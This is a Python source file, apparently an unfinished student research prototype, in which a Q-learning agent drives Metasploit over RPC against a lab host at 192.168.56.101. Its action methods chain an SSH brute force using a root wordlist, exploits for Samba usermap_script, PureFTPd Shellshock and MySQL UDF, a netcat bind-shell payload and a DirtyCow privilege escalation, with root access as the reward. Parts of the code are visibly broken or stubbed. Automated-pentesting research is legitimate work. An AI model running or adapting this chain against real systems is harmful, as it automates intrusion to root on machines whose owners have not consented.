# coding=utf-8
"""
This part of code is the Q learning brain, which is a brain of the agent.
All decisions are made in here.

View more on my tutorial page: https://morvanzhou.github.io/tutorials/
"""

import numpy as np
import pandas as pd
import time
import re
from metasploit.msfrpc import MsfRpcClient
from metasploit.msfconsole import MsfRpcConsole


class QLearningTable:
    def __init__(self, actions, learning_rate=0.01, reward_decay=0.9, e_greedy=0.9):
        self.actions = actions  # a list
        self.lr = learning_rate
        self.gamma = reward_decay
        self.epsilon = e_greedy
        self.q_tables = {}
        #self.q_table = pd.DataFrame(columns=self.actions, dtype=np.float64)
        
        self.client = MsfRpcClient('password')
        self.console = MsfRpcConsole(self.client, cb=self.read_console)
        
        self.global_positive_out = list()
        self.global_console_status = False
        self.success=False
        self.whoami= 'undefined'
        self.session=0
        self.state_actions= self.initialise_state_actions()
        
    def read_console(self, console_data):
        p = re.compile("session ([0-9]*)")
        self.global_console_status = console_data['busy']
        #print global_console_status
        
        if '[+]' in console_data['data']:
            sigdata = console_data['data'].rstrip().split('\n')
            for line in sigdata:
                    if '[+]' in line:
                    		self.global_positive_out.append(line)
                            
        if ("Success" in console_data['data']) or ("opened" in console_data['data']):
            self.success= True
            #print('success='+ str(success))
        else:
            self.success= False
            
        if ("root" in console_data['data']):
            self.whoami = 'root'
        else:
            self.whoami = 'undefined'
            
        if p.search(console_data['data']) != None:
            self.session= p.search(console_data['data']).group(1)
            
        print console_data['data']
        
    def update_q_tables(self, observation):
        if str(observation) not in self.q_tables.keys():
            self.q_tables[str(observation)]= pd.DataFrame(columns=self.actions, dtype=np.float64)
    
    def update_actions(self, observation): # à compléter
        print( self.q_tables)
        if self.q_tables == {}: # si c'est le premier update on doit forcement prendre les actions de l'état nmap, mais bon ça veut dire qu'on suppose qu'on ne fait qu'un seul nmap dans chaque partie, ce qui ne sera pas forcément le cas plutard, donc à revoir
            self.actions = self.state_actions['nmap']
            return 
        self.actions = self.state_actions[observation]
        
    
    def initialise_state_actions(self): # à compléter
        return {
                'nmap': [self.ssh_login, self.samba, self.ftp1, self.mysql],
                'ssh_login': [self.dirtyCow, self.ls],
                'terminal': []
                }

    def choose_action(self, observation):
        self.check_state_exist(str(observation))
        # action selection
        if np.random.uniform() < self.epsilon:
            # choose best action
            state_action = self.q_tables[str(observation)].loc[observation, :]
            # some actions may have the same value, randomly choose on in these actions
            action = np.random.choice(state_action[state_action == np.max(state_action)].index)
        else:
            # choose random action
            action = np.random.choice(self.actions)
        return action

    def learn(self, s, a, r, s_):
        self.check_state_exist(s_)
        q_predict = self.q_tables[s].loc[s, a]
        if s_ != 'terminal':
            q_target = r + self.gamma * self.q_tables[s_].loc[s_, :].max()  # next state is not terminal
        else:
            q_target = r  # next state is terminal
        self.q_tables[s].loc[s, a] += self.lr * (q_target - q_predict)  # update

    def check_state_exist(self, state):
        if state not in self.q_tables[state].index:
            # append new state to q table
            self.q_tables[state] = self.q_tables[state].append(
                pd.Series(
                    [0]*len(self.actions),
                    index=self.q_tables[state].columns,
                    name=state,
                )
            )
                
    def nmap(self):
        # à modifier
        return str({'port21':True, 'port22':True, 'port139':True, 'port3306':True}) 
    
    def step(self, action):
        #s_ = 'terminal'  # next state, à modifier
        
        success2, whoami2= action() # à vérifier
        print( str(action) )

        #time.sleep(20) # modifier, pas bon de faire comme ça
        
        # reward function
        #if s_ == self.canvas.coords(self.oval):
        if whoami2 == 'root':
            reward = 1 
            done = True
            s_ = 'terminal'
            print('success2='+str(success2))
            print('whoami2=' + whoami2)
        elif (whoami2 == 'undefined') and (success2==True) : # à optimiser
            reward = 0
            done = False
            s_ = 'ssh_login'  # voir comment récuperer la string 'ssh_login' de la fonction dont le nom est ssh_login()
            print('success2='+str(success2))
            print('whoami2=' + whoami2)
        elif (success2 == False): # à optimiser
            reward = -1
            done = True
            s_= 'terminal'
            print('success2='+str(success2))
            print('whoami2=' + whoami2)
            
#        else:
#            reward = 0
#            done = False

        return s_, reward, done
    
    
    
    # ACTIONS OF THE REINFORCEMENT LEARNING MODEL
    def ssh_login(self):
        self.console.execute('use auxiliary/scanner/ssh/ssh_login')
        self.console.execute('set RHOSTS 192.168.56.101')
        self.console.execute('set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt')
        self.console.execute('set STOP_ON_SUCCESS true')
        self.console.execute('run')
        time.sleep(5)
        
        a= self.success
        
        if a:
            self.console.execute('sessions -i ' + str(self.session))
            time.sleep(5)
            
        if a:
            self.console.execute('whoami')
            time.sleep(5)
        
        b= self.whoami
        
        while self.global_console_status:
        #while console.console.read()['busy']:
            time.sleep(2)
            
        time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console' 
        
        return a, b
            
    def samba(self):
        self.console.execute('use exploit/multi/samba/usermap_script')
        self.console.execute('set RHOST 192.168.56.101')
        self.console.execute('set payload cmd/unix/bind_netcat')
        self.console.execute('exploit')
        time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
        a= self.success
        
        if a:
            self.console.execute('whoami')
            time.sleep(5)
            
        time.sleep(5) #sans le sleep il y a des problemes d'ordre d'execution
        b= self.whoami
        
        time.sleep(2) 
        
        return a, b
        
    def ftp1(self):
        self.console.execute('use exploit/multi/ftp/pureftpd_bash_env_exec')
        self.console.execute('set RHOST 192.168.56.101')
        self.console.execute('exploit')
        time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
        a= self.success
        
        if a:
            self.console.execute('whoami')
            time.sleep(5)
            
        b= self.whoami
        
        return a, b
        
    def mysql(self):
        self.console.execute('use exploit/multi/mysql/mysql_udf_payload')
        self.console.execute('set RHOST 192.168.56.101')
        self.console.execute('exploit')
        time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
        a= self.success
        
        if a:
            self.console.execute('whoami')
            time.sleep(5)
        
        b= self.whoami
        
        return a, b
    
    def dirtyCow(self):  # suite de ssh_login
        self.console.execute('./cow')
        #time.sleep(70) pas besoin finalement apparemment, car on reste sur le même thread
        self.console.execute('/usr/bin/passwd')
        time.sleep(5)  # utile?
        self.console.execute('whoami')
        time.sleep(5)
        
        # revoir s'il y a un meilleur moyen de retourner self.success et self.whoami
        if self.whoami=='root':
            return True, 'root'
        else: 
            return False, 'undefined'
        
    def ls(self):
        self.console.execute('ls')
        self.console.execute('whoami')
        
        return False, 'undefined' # ls est juste une fonction de test c'est pourquoi je retourne n'importe quoi
            